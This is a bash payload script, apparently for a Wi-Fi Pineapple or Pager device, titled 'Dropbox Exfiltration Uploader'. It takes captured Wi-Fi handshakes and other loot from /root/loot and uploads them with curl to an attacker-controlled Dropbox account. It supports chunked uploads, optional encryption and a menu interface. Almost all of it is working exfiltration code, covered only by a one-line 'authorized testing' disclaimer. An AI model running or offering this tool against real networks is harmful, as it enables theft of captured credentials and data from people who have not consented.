#!/bin/bash
# Title: Dropbox Exfiltration Uploader v3.0
# Description: Upload collected data to Dropbox with OAuth2 authentication
# Author: macr0hack422
# Version: 3.0
# Category: Exfiltration
#
# This payload provides secure data exfiltration to Dropbox using the official
# Dropbox API v2 with OAuth2 authentication. Files are uploaded to a specific
# folder in the user's Dropbox account.
#
# v3.0 Changes:
# - Simplified menu system using NUMBER_PICKER (like SSID Chaos)
# - Cleaner Pager GUI integration
# - Maintains v2.0 compatibility shim
#
# Features:
# - OAuth2 authentication flow (with app folder access for security)
# - Automatic token refresh handling
# - Chunked uploads for large files (>150MB)
# - Directory upload support (recursive)
# - Optional AES-256 encryption before upload
# - Upload progress tracking
# - Upload history and session logging
# - Conflict resolution (rename/overwrite/skip)
#
# SETUP INSTRUCTIONS:
# 1. Create a Dropbox app at: https://www.dropbox.com/developers/apps
#    - Select "Scoped App"
#    - Choose "App Folder" access for security (recommended)
#    - Enable scopes: files.content.write, files.content.read
# 2. Scroll to "Generated access token" section and click "Generate"
# 3. Copy the token and paste it into the ACCESS_TOKEN variable below
# 4. That's it! The token never expires (unless you revoke it)
#
#
# IMPORTANT: For authorized security testing only.
# Keep your access token secret - don't share the payload with the token in it.

# ============================================
# CONFIGURATION
# ============================================

UPLOAD_DIR="/root/loot/dropbox_exfil"
TOKEN_FILE="$UPLOAD_DIR/.dropbox_token"
SESSION_LOG="$UPLOAD_DIR/upload_sessions.log"
CONFIG_FILE="$UPLOAD_DIR/config.conf"

# Dropbox API endpoints
API_BASE="https://api.dropboxapi.com"
CONTENT_BASE="https://content.dropboxapi.com"
AUTH_URL="https://www.dropbox.com/oauth2/authorize"
TOKEN_URL="https://api.dropboxapi.com/oauth2/token"

# Access token (paste from Dropbox developer page)
# Generate at: https://www.dropbox.com/developers/apps
# 1. Open your app (Scoped App, App Folder)
# 2. Scroll to "Generated access token"
# 3. Click "Generate" button
# 4. Paste token below between the quotes
ACCESS_TOKEN=""

# Upload settings
DROPBOX_APP_NAME="pager"  # Name of your Dropbox app (for reference)
DROPBOX_ROOT="/"              # Root path in app folder (usually "/" for app folder access)
DROPBOX_PATH="/Pineapple"      # Subfolder for uploads (will be created in app folder)
CHUNK_SIZE=10485760           # 10MB chunks (Dropbox recommends 8-16MB)
MAX_SINGLE_SIZE=157286400     # 150MB (above this requires chunked upload)

# Encryption
ENCRYPTION_KEY=""
ENCRYPTION_ALGO="aes-256-cbc"

# ============================================
# INITIALIZATION
# ============================================

mkdir -p "$UPLOAD_DIR"

# Logging function
LOG() {
    local level="$1"
    shift
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [$level] $*" >> "$UPLOAD_DIR/debug.log"
}

# Initialize log
LOG "INFO" "==========================================="
LOG "INFO" "Dropbox Exfiltration Payload v3.0"
LOG "INFO" "Initializing..."
LOG "INFO" "Upload directory: $UPLOAD_DIR"
LOG "INFO" "Token file: $TOKEN_FILE"
LOG "INFO" "==========================================="

# ============================================
# AUTHENTICATION
# ============================================

# Save access token
save_token() {
    local access_token="$1"
    local refresh_token="$2"
    local expires_in="$3"

    LOG "INFO" "Saving access token to $TOKEN_FILE"

    local expiry_time
    expiry_time=$(($(date +%s) + expires_in - 300))  # Refresh 5 min early

    cat > "$TOKEN_FILE" <<EOF
ACCESS_TOKEN="$access_token"
REFRESH_TOKEN="$refresh_token"
EXPIRES_AT="$expiry_time"
EOF

    chmod 600 "$TOKEN_FILE"
    LOG "SUCCESS" "Token saved successfully (expires at $(date -d @$expiry_time -Is 2>/dev/null || echo 'unknown'))"
}

# Load saved token
load_token() {
    # First check for pre-configured token in script
    if [ -n "$ACCESS_TOKEN" ]; then
        printf '%s' "$ACCESS_TOKEN"
        return 0
    fi

    LOG "INFO" "Loading saved token from $TOKEN_FILE"

    if [ ! -f "$TOKEN_FILE" ]; then
        LOG "ERROR" "Token file not found"
        return 1
    fi

    # Try to parse as JSON first (new format)
    if command -v jq >/dev/null 2>&1; then
        local token=$(jq -r '.access_token' "$TOKEN_FILE" 2>/dev/null)
        if [ -n "$token" ] && [ "$token" != "null" ]; then
            LOG "SUCCESS" "Token loaded (JSON format)"
            printf '%s' "$token"
            return 0
        fi
    fi

    # Fall back to old format (shell source)
    source "$TOKEN_FILE"

    # Check if token needs refresh
    local now
    now=$(date +%s)

    if [ -n "$EXPIRES_AT" ] && [ $now -ge $EXPIRES_AT ]; then
        LOG "WARN" "Token expired (expired at $(date -d @$EXPIRES_AT -Is 2>/dev/null || echo 'unknown')), attempting refresh..."
        refresh_access_token
        source "$TOKEN_FILE"
    fi

    LOG "SUCCESS" "Token loaded successfully"
    printf '%s' "$ACCESS_TOKEN"
    return 0
}

# Refresh access token using refresh token
refresh_access_token() {
    LOG "INFO" "Attempting to refresh access token"

    if [ ! -f "$TOKEN_FILE" ]; then
        LOG "ERROR" "Cannot refresh: token file not found"
        return 1
    fi

    source "$TOKEN_FILE"

    LOG "INFO" "Refresh token: ${REFRESH_TOKEN:0:8}..."

    # Note: Dropbox refresh tokens require app with appropriate permissions
    # This is a placeholder - actual implementation depends on app type
    LOG "WARN" "Automatic token refresh not available, manual re-authorization required"
    LOG yellow "Token refresh - please re-authorize"
    return 1
}

# Get authorization URL (manual flow for headless devices)
get_auth_url() {
    local app_key="$1"

    local redirect_uri="http://localhost:8080"  # Dropbox doesn't use this for manual flow

    echo "${AUTH_URL}?client_id=${app_key}&response_type=code&token_access_type=offline"
}

# Exchange authorization code for access token
exchange_code_for_token() {
    local app_key="$1"
    local app_secret="$2"
    local code="$3"

    LOG "INFO" "Exchanging authorization code for access token"
    LOG "INFO" "Code: ${code:0:8}..."

    local response
    response=$(curl -s -X POST "$TOKEN_URL" \
        -u "$app_key:$app_secret" \
        -d "code=$code" \
        -d "grant_type=authorization_code")

    LOG "DEBUG" "Token exchange response: $response"

    local access_token
    access_token=$(echo "$response" | grep -o '"access_token":"[^"]*' | cut -d'"' -f4)

    if [ -n "$access_token" ]; then
        LOG "SUCCESS" "Access token received: ${access_token:0:8}..."

        # Note: Refresh tokens only available for specific app types
        local refresh_token
        refresh_token=$(echo "$response" | grep -o '"refresh_token":"[^"]*' | cut -d'"' -f4)
        refresh_token="${refresh_token:-none}"

        if [ "$refresh_token" != "none" ]; then
            LOG "INFO" "Refresh token received: ${refresh_token:0:8}..."
        else
            LOG "INFO" "No refresh token (app may not support offline access)"
        fi

        local expires_in
        expires_in=$(echo "$response" | grep -o '"expires_in":[0-9]*' | cut -d':' -f2)
        expires_in="${expires_in:-14400}"  # Default 4 hours

        LOG "INFO" "Token expires in: ${expires_in}s ($((expires_in / 3600))h)"

        save_token "$access_token" "$refresh_token" "$expires_in"
        return 0
    else
        LOG "ERROR" "Failed to get access token from Dropbox"
        LOG "ERROR" "API response: $response"
        LOG red "Failed to get access token"
        LOG "Response: $response"
        return 1
    fi
}

# Check if token is valid
check_token() {
    local token="$1"

    LOG "INFO" "Validating access token..."

    local response
    response=$(curl -s -X POST "$API_BASE/2/users/get_current_account" \
        -H "Authorization: Bearer $token")

    if echo "$response" | grep -q '"email"'; then
        local email
        email=$(echo "$response" | grep -o '"email":"[^"]*' | cut -d'"' -f4)
        LOG "SUCCESS" "Token validation successful (account: $email)"
        return 0
    else
        LOG "ERROR" "Token validation failed: $response"
        return 1
    fi
}

# ============================================
# ENCRYPTION (Optional)
# ============================================

# Encrypt file before upload
encrypt_file() {
    local input="$1"
    local output="$2"

    if [ -z "$ENCRYPTION_KEY" ]; then
        cp "$input" "$output"
        return 0
    fi

    if ! command -v openssl >/dev/null 2>&1; then
        LOG yellow "openssl not available, uploading unencrypted"
        cp "$input" "$output"
        return 0
    fi

    openssl enc -"$ENCRYPTION_ALGO" -salt -pbkdf2 -iter 100000 \
        -in "$input" -out "$output" \
        -pass env:ENCRYPTION_KEY 2>/dev/null

    return $?
}

# ============================================
# DROPBOX API OPERATIONS
# ============================================

# Upload small file (<150MB)
upload_file_simple() {
    local token="$1"
    local local_path="$2"
    local remote_path="$3"
    local mode="${4:-add}"  # add, overwrite, update

    local encrypted_file="/tmp/dropbox_upload_${SESSION_ID}.enc"

    # Encrypt if key is set
    if [ -n "$ENCRYPTION_KEY" ]; then
        LOG "INFO" "Encrypting file before upload..."
        LOG "Encrypting file..."
        if ! encrypt_file "$local_path" "$encrypted_file"; then
            LOG "ERROR" "Encryption failed for $local_path"
            LOG red "Encryption failed"
            return 1
        fi
        local_path="$encrypted_file"
        LOG "SUCCESS" "File encrypted successfully"
    fi

    # Add .enc extension if encrypted
    [ -n "$ENCRYPTION_KEY" ] && remote_path="${remote_path}.enc"

    LOG "DEBUG" "Starting simple upload to: $remote_path (mode: $mode)"

    local response
    response=$(curl -s -X POST "$CONTENT_BASE/2/files/upload" \
        -H "Authorization: Bearer $token" \
        -H "Dropbox-API-Arg: {\"path\":\"$remote_path\",\"mode\":\"$mode\",\"autorename\":false}" \
        -H "Content-Type: application/octet-stream" \
        --data-binary "@$local_path")

    rm -f "$encrypted_file"

    if echo "$response" | grep -q '"name"'; then
        LOG "SUCCESS" "File uploaded successfully: $remote_path"
        return 0
    else
        LOG "ERROR" "Upload failed for $remote_path"
        LOG "ERROR" "API response: $response"
        LOG red "Upload failed: $response"
        return 1
    fi
}

# Start chunked upload session
start_upload_session() {
    local token="$1"
    local local_path="$2"

    local file_size
    # Try multiple methods to get file size
    file_size=$(stat -c%s "$local_path" 2>/dev/null)
    if [ -z "$file_size" ] || [ "$file_size" = "0" ]; then
        file_size=$(stat -f%z "$local_path" 2>/dev/null)
    fi
    if [ -z "$file_size" ] || [ "$file_size" = "0" ]; then
        file_size=$(wc -c < "$local_path" 2>/dev/null | tr -d ' ')
    fi
    if [ -z "$file_size" ] || [ "$file_size" = "0" ]; then
        file_size=$(ls -l "$local_path" 2>/dev/null | awk '{print $5}')
    fi

    LOG "INFO" "Starting chunked upload session for file ($file_size bytes)"

    local encrypted_file="/tmp/dropbox_upload_${SESSION_ID}.enc"

    # Encrypt if needed
    if [ -n "$ENCRYPTION_KEY" ]; then
        LOG "INFO" "Encrypting file for chunked upload..."
        if ! encrypt_file "$local_path" "$encrypted_file" 2>/dev/null; then
            LOG "ERROR" "Encryption failed for chunked upload"
            return 1
        fi
        local_path="$encrypted_file"
        LOG "SUCCESS" "File encrypted for chunked upload"
    fi

    # Start session with first chunk
    LOG "INFO" "Uploading first chunk ($CHUNK_SIZE bytes)..."

    local response
    response=$(head -c "$CHUNK_SIZE" "$local_path" | \
        curl -s -X POST "$CONTENT_BASE/2/files/upload_session/start" \
        -H "Authorization: Bearer $token" \
        -H "Content-Type: application/octet-stream" \
        --data-binary @-)

    local session_id
    # Extract session_id - handle both formats: "session_id":"..." and "session_id": "..."
    session_id=$(echo "$response" | grep -o '"session_id"[[:space:]]*:[[:space:]]*"[^"]*' | sed 's/.*"session_id"[[:space:]]*:[[:space:]]*"\([^"]*\).*/\1/')

    rm -f "$encrypted_file"

    if [ -n "$session_id" ]; then
        LOG "SUCCESS" "Upload session started: ${session_id:0:16}..."
        printf '%s' "$session_id"
        return 0
    else
        LOG "ERROR" "Failed to start upload session"
        LOG "ERROR" "API response: $response"
        return 1
    fi
}

# Append chunk to upload session
append_chunk() {
    local token="$1"
    local session_id="$2"
    local local_path="$3"
    local offset="$4"

    # Extract chunk
    local chunk
    chunk=$(tail -c +"$((offset + 1))" "$local_path" | head -c "$CHUNK_SIZE")

    LOG "DEBUG" "Appending chunk at offset $offset ($CHUNK_SIZE bytes)"

    local response
    response=$(echo -n "$chunk" | \
        curl -s -X POST "$CONTENT_BASE/2/files/upload_session/append_v2" \
        -H "Authorization: Bearer $token" \
        -H "Dropbox-API-Arg: {\"cursor\":{\"session_id\":\"$session_id\",\"offset\":$offset},\"close\":false}" \
        -H "Content-Type: application/octet-stream" \
        --data-binary @-)

    if ! echo "$response" | grep -q '"null"' && ! echo "$response" | grep -q '"result":null'; then
        LOG "ERROR" "Chunk append failed at offset $offset"
        LOG "ERROR" "API response: $response"
        LOG red "Chunk append failed: $response"
        return 1
    fi

    return 0
}

# Finish chunked upload
finish_upload_session() {
    local token="$1"
    local session_id="$2"
    local remote_path="$3"
    local local_path="$4"

    # Get file size for cursor - try multiple methods
    local file_size
    file_size=$(stat -c%s "$local_path" 2>/dev/null)
    if [ -z "$file_size" ] || [ "$file_size" = "0" ]; then
        file_size=$(stat -f%z "$local_path" 2>/dev/null)
    fi
    if [ -z "$file_size" ] || [ "$file_size" = "0" ]; then
        file_size=$(wc -c < "$local_path" 2>/dev/null | tr -d ' ')
    fi
    if [ -z "$file_size" ] || [ "$file_size" = "0" ]; then
        file_size=$(ls -l "$local_path" 2>/dev/null | awk '{print $5}')
    fi

    [ -n "$ENCRYPTION_KEY" ] && remote_path="${remote_path}.enc"

    LOG "INFO" "Finishing chunked upload session"
    LOG "INFO" "Session ID: ${session_id:0:16}..."
    LOG "INFO" "Final path: $remote_path"
    LOG "DEBUG" "Total size: $file_size bytes"

    local response
    response=$(curl -s -X POST "$CONTENT_BASE/2/files/upload_session/finish" \
        -H "Authorization: Bearer $token" \
        -H "Dropbox-API-Arg: {\"cursor\":{\"session_id\":\"$session_id\",\"offset\":$file_size},\"commit\":{\"path\":\"$remote_path\",\"mode\":\"add\",\"autorename\":false}}" \
        -H "Content-Type: application/octet-stream" \
        --data-binary "")

    if echo "$response" | grep -q '"name"'; then
        LOG "SUCCESS" "Chunked upload completed successfully: $remote_path"
        return 0
    else
        LOG "ERROR" "Failed to finish chunked upload"
        LOG "ERROR" "API response: $response"
        LOG red "Finish upload failed: $response"
        return 1
    fi
}

# Upload file (auto-chunking)
upload_file() {
    local token="$1"
    local local_path="$2"
    local remote_path="$3"

    local file_size
    # Try multiple methods to get file size (different stat versions across systems)
    file_size=$(stat -c%s "$local_path" 2>/dev/null)
    if [ -z "$file_size" ] || [ "$file_size" = "0" ]; then
        file_size=$(stat -f%z "$local_path" 2>/dev/null)
    fi
    if [ -z "$file_size" ] || [ "$file_size" = "0" ]; then
        file_size=$(wc -c < "$local_path" 2>/dev/null | tr -d ' ')
    fi
    if [ -z "$file_size" ] || [ "$file_size" = "0" ]; then
        file_size=$(ls -l "$local_path" 2>/dev/null | awk '{print $5}')
    fi

    # Default to small file if we can't determine size
    if [ -z "$file_size" ]; then
        file_size=0
        LOG "WARN" "Could not determine file size, assuming small file"
    fi

    local filename=$(basename "$local_path")

    LOG "INFO" "Starting upload: $filename ($file_size bytes)"
    LOG "INFO" "Remote path: $remote_path"

    local start_time=$(date +%s)

    if [ $file_size -le $MAX_SINGLE_SIZE ] && [ $file_size -gt 0 ]; then
        # Simple upload
        LOG "INFO" "Using simple upload (file < 150MB)"

        if upload_file_simple "$token" "$local_path" "$remote_path"; then
            local end_time=$(date +%s)
            local duration=$((end_time - start_time))
            if [ $duration -gt 0 ]; then
                local speed=$((file_size / duration))
                LOG "SUCCESS" "Upload complete in ${duration}s ($speed bytes/s)"
            else
                LOG "SUCCESS" "Upload complete"
            fi
            return 0
        else
            LOG "ERROR" "Simple upload failed"
            return 1
        fi
    else
        # Chunked upload
        LOG "INFO" "Large file detected, using chunked upload (>150MB)"

        local session_id
        session_id=$(start_upload_session "$token" "$local_path") || return 1

        LOG "INFO" "Session started: $session_id"

        # Upload remaining chunks
        local offset=$CHUNK_SIZE
        local chunk_num=1
        local total_chunks=$(((file_size + CHUNK_SIZE - 1) / CHUNK_SIZE))

        while [ $offset -lt $file_size ]; do
            local percent=$((offset * 100 / file_size))
            LOG "Uploading chunk $chunk_num/$total_chunks ($percent%)..."

            if ! append_chunk "$token" "$session_id" "$local_path" "$offset"; then
                LOG "ERROR" "Chunk upload failed at chunk $chunk_num"
                return 1
            fi

            offset=$((offset + CHUNK_SIZE))
            chunk_num=$((chunk_num + 1))
        done

        # Finish upload
        if finish_upload_session "$token" "$session_id" "$remote_path" "$local_path"; then
            local end_time=$(date +%s)
            local duration=$((end_time - start_time))
            local speed=$((file_size / duration))
            LOG "SUCCESS" "Chunked upload complete: ${total_chunks} chunks in ${duration}s ($speed bytes/s)"
            return 0
        else
            LOG "ERROR" "Failed to finish upload session"
            return 1
        fi
    fi
}

# Upload directory recursively
upload_directory() {
    local token="$1"
    local local_dir="$2"
    local remote_dir="$3"

    local dirname=$(basename "$local_dir")
    LOG "INFO" "Starting directory upload: $dirname"
    LOG "INFO" "Local: $local_dir"
    LOG "INFO" "Remote: $remote_dir"

    LOG "DEBUG" "Counting files in directory..."
    local file_count=0
    local success_count=0
    local total_size=0
    local start_time=$(date +%s)

    # Count files using simple for loop (more portable)
    for file in "$local_dir"/*; do
        if [ -f "$file" ]; then
            ((file_count++))
            local fsize
            # Try multiple methods to get file size
            fsize=$(stat -c%s "$file" 2>/dev/null)
            if [ -z "$fsize" ] || [ "$fsize" = "0" ]; then
                fsize=$(stat -f%z "$file" 2>/dev/null)
            fi
            if [ -z "$fsize" ] || [ "$fsize" = "0" ]; then
                fsize=$(wc -c < "$file" 2>/dev/null | tr -d ' ')
            fi
            if [ -z "$fsize" ] || [ "$fsize" = "0" ]; then
                fsize=$(ls -l "$file" 2>/dev/null | awk '{print $5}')
            fi
            # Default to 0 if all methods fail
            fsize=${fsize:-0}
            total_size=$((total_size + fsize))
            LOG "DEBUG" "Found file: $(basename "$file") ($fsize bytes)"
        fi
    done

    LOG "INFO" "Found $file_count files ($total_size bytes total)"

    if [ $file_count -eq 0 ]; then
        LOG "WARN" "No files found in directory"
        LOG yellow "No files to upload"
        return 1
    fi

    # Upload each file
    local current_file=0
    for file in "$local_dir"/*; do
        if [ -f "$file" ]; then
            ((current_file++))

            local filename=$(basename "$file")
            local remote_path="$remote_dir/$filename"

            LOG "[$current_file/$file_count] Uploading: $filename"
            LOG "INFO" "Uploading file $current_file/$file_count: $filename"

            if upload_file "$token" "$file" "$remote_path"; then
                ((success_count++))
                LOG green "  ✓ Success"
                LOG "SUCCESS" "Uploaded: $filename"
            else
                LOG red "  ✗ Failed"
                LOG "ERROR" "Failed to upload: $filename"
            fi
        fi
    done

    local end_time=$(date +%s)
    local duration=$((end_time - start_time))

    LOG "INFO" "Directory upload complete: $success_count/$file_count files"
    LOG "INFO" "Duration: ${duration}s, Total size: $total_size bytes"

    return 0
}

# Create Dropbox folder
create_folder() {
    local token="$1"
    local path="$2"

    LOG "INFO" "Creating Dropbox folder: $path"

    local response
    response=$(curl -s -X POST "$API_BASE/2/files/create_folder_v2" \
        -H "Authorization: Bearer $token" \
        -H "Content-Type: application/json" \
        -d "{\"path\":\"$path\",\"autorename\":false}")

    if echo "$response" | grep -q '"name"'; then
        LOG "SUCCESS" "Folder created: $path"
        return 0
    elif echo "$response" | grep -q '"error".*path.*not_found'; then
        LOG "INFO" "Parent folder doesn't exist, attempting to create parents..."
        # Extract parent path
        local parent_path="${path%/*}"
        if [ "$parent_path" != "$path" ]; then
            create_folder "$token" "$parent_path"
            create_folder "$token" "$path"
        fi
    elif echo "$response" | grep -q '"error".*path.*conflict'; then
        LOG "INFO" "Folder already exists: $path"
        return 0
    else
        LOG "WARN" "Failed to create folder: $response"
        return 1
    fi
}

# ============================================
# MAIN FUNCTIONS
# ============================================

# Get source to upload
get_source() {
    PROMPT "SELECT UPLOAD SOURCE

1. Handshakes directory
2. Loot directory
3. Custom file
4. Custom directory
0. Back to main menu"

    local choice
    choice=$(NUMBER_PICKER "Select option" 1)

    case "$choice" in
        1)
            echo "/root/loot/handshakes"
            ;;
        2)
            echo "/root/loot"
            ;;
        3)
            local path
            path=$(TEXT_PICKER "File Path" "/root/loot/data.txt")
            echo "$path"
            ;;
        4)
            local path
            path=$(TEXT_PICKER "Directory Path" "/root/loot")
            echo "$path"
            ;;
        0)
            echo ""
            ;;
        *)
            echo ""
            ;;
    esac
}

# Main upload routine
main_upload() {
    local token="$1"
    local source="$2"
    local remote_folder="${3:-$DROPBOX_PATH}"

    SESSION_ID=$(date '+%Y%m%d%H%M%S')

    LOG "INFO" "==========================================="
    LOG "INFO" "Starting upload session: $SESSION_ID"
    LOG "INFO" "Source: $source"
    LOG "INFO" "Destination: $remote_folder"
    LOG "INFO" "==========================================="

    LOG ""
    LOG "╔════════════════════════════════════════╗"
    LOG "║   DROPBOX UPLOAD                      ║"
    LOG "╚════════════════════════════════════════╝"
    LOG ""
    LOG "Source: $source"
    LOG "Destination: $remote_folder"
    LOG ""

    # Verify source exists
    if [ ! -e "$source" ]; then
        LOG "ERROR" "Source not found: $source"
        ERROR_DIALOG "Source not found"
        return 1
    fi

    LOG "INFO" "Source verified, proceeding with upload"

    # Ensure remote folder exists
    LOG "INFO" "Ensuring remote folder exists: $remote_folder"
    create_folder "$token" "$remote_folder"

    local session_start=$(date +%s)
    local result=0

    # Upload
    if [ -f "$source" ]; then
        local filename
        filename=$(basename "$source")
        LOG "INFO" "File upload detected: $filename"
        upload_file "$token" "$source" "$remote_folder/$filename"
        result=$?
    elif [ -d "$source" ]; then
        local dirname
        dirname=$(basename "$source")
        LOG "INFO" "Directory upload detected: $dirname"
        upload_directory "$token" "$source" "$remote_folder/$dirname"
        result=$?
    fi

    local session_end=$(date +%s)
    local session_duration=$((session_end - session_start))

    LOG "INFO" "Upload session completed in ${session_duration}s"
    LOG "INFO" "Result: $([ $result -eq 0 ] && echo 'SUCCESS' || echo 'FAILED')"

    # Log session
    {
        echo "[$(date -Iseconds)] Session: $SESSION_ID"
        echo "  Source: $source"
        echo "  Destination: $remote_folder"
        echo "  Duration: ${session_duration}s"
        echo "  Result: $([ $result -eq 0 ] && echo 'SUCCESS' || echo 'FAILED')"
        echo ""
    } >> "$SESSION_LOG"

    return $result
}

# ============================================
# MAIN MENU
# ============================================

main_menu() {
    while true; do
        # Check for saved token or pre-configured token
        local token_status="[ ] No token - edit script to add ACCESS_TOKEN"
        if [ -n "$ACCESS_TOKEN" ]; then
            token_status="[✓] Access token configured"
        elif [ -f "$TOKEN_FILE" ]; then
            token_status="[✓] Token file found"
        fi

        PROMPT "DROPBOX EXFILTRATION v3.0
Author: macr0hack422

$token_status

1. Upload files/folders
2. View upload log
0. Exit"

        local choice
        choice=$(NUMBER_PICKER "Select option" 1)

        case "$choice" in
            1)
                local token
                token=$(load_token)

                if [ $? -ne 0 ]; then
                    ERROR_DIALOG "Not authenticated - edit script to add ACCESS_TOKEN"
                    continue
                fi

                if ! check_token "$token"; then
                    ERROR_DIALOG "Token invalid - edit script to fix ACCESS_TOKEN"
                    continue
                fi

                local source
                source=$(get_source)

                if [ -n "$source" ]; then
                    main_upload "$token" "$source"
                    RINGTONE "success" &
                fi

                PROMPT "Press any key to continue..."
                ;;
            2)
                PROMPT "UPLOAD HISTORY

$(if [ -f "$SESSION_LOG" ]; then
    tail -20 "$SESSION_LOG"
else
    echo "No upload history"
fi)

Press any key to continue..."
                ;;
            0)
                LOG ""
                LOG yellow "Exiting..."
                exit 0
                ;;
        esac
    done
}

# ============================================
# START
# ============================================

main_menu
